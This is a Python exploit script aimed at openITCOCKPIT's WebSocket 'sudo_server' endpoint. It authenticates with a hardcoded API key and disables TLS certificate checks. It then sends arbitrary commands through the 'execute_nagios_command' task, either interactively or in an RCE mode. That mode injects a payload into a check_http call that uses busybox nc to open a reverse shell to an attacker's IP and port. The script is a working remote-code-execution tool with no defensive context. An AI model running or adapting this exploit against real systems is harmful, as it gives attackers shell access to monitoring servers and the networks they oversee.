#!/usr/bin/env python3

import websocket
import ssl
import json
import argparse
import threading
import sys
import time

uniqid = ""
key = ""
mode = "interactive"  # default mode

def toJson(task, data):
    return json.dumps({
        "task": task,
        "data": data,
        "uniqid": uniqid,
        "key": key
    })

def on_message(ws, message):
    global uniqid
    try:
        mes = json.loads(message)
    except json.JSONDecodeError:
        print("[!] Invalid JSON received:", message)
        return

    if "uniqid" in mes:
        uniqid = mes["uniqid"]

    match mes.get("type"):
        case "connection":
            print("[+] Connected!")

            if mode == "rce":
                lhost = input("Enter your attacking machine IP address: ")
                lport = input("Enter the listening port: ")
                payload = f"./check_http -I {lhost} -p 7777 -k 'test -c 'busybox nc {lhost} {lport} -e sh"
                print(f"[+] Sending RCE payload:\n{payload}")
                ws.send(toJson("execute_nagios_command", payload))
                # Give server time to respond before closing
                time.sleep(2)
                ws.close()

        case "dispatcher":
            pass
        case "response":
            print(mes.get("payload", ""), end='')
        case _:
            print(mes)

def on_error(ws, error):
    print("[!] Error:", error)

def on_close(ws, close_status_code, close_msg):
    print(f"[+] Connection Closed ({close_status_code}): {close_msg}")

def on_open(ws):
    if mode != "interactive":
        return

    def run():
        while True:
            try:
                cmd = input(">>> ")
                ws.send(toJson("execute_nagios_command", cmd))
            except KeyboardInterrupt:
                print("\n[!] Keyboard Interrupt. Closing connection.")
                ws.close()
                break
    threading.Thread(target=run, daemon=True).start()

def main():
    global key, mode

    parser = argparse.ArgumentParser(
        description="WebSocket client for openITCOCKPIT command execution"
    )
    parser.add_argument('--url', '-u', default="wss://openitcockpit/sudo_server", help='WebSocket URL')
    parser.add_argument('--key', '-k', default="1fea123e07f730f76e661bced33a94152378611e", help='openITCOCKPIT API Key')
    parser.add_argument('--mode', '-m', choices=['interactive', 'rce'], default='interactive', help='Client mode (interactive or rce)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose output')
    args = parser.parse_args()

    key = args.key
    mode = args.mode
    websocket.enableTrace(args.verbose)

    ssl_opts = {"cert_reqs": ssl.CERT_NONE}

    ws = websocket.WebSocketApp(args.url,
                                on_message=on_message,
                                on_error=on_error,
                                on_close=on_close,
                                on_open=on_open)
    try:
        ws.run_forever(sslopt=ssl_opts)
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Exiting.")
        sys.exit(0)

if __name__ == "__main__":
    main()
